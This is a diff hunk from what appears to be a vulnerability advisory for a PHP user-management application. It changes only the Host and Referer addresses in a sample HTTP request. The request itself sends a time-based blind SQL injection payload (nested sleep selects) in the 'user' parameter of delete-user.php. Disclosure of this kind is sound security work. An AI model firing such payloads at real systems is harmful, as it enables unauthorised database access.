@@ -16,11 +16,11 @@ Vulnerability File: /endpoint/add-user.php ;/home.php
 ```
 GET /endpoint/delete-user.php?user=(select(0)from(select(sleep(4)))v)/*'%2B(select(0)from(select(sleep(4)))v)%2B'"%2B(select(0)from(select(sleep(4)))v)%2B"*/ HTTP/1.1
 X-Requested-With: XMLHttpRequest
-Referer: http://192.168.6.1/
+Referer: http://127.0.0.1/
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
-Host: 192.168.6.1
+Host: 127.0.0.1
 Connection: Keep-alive
 
 ```
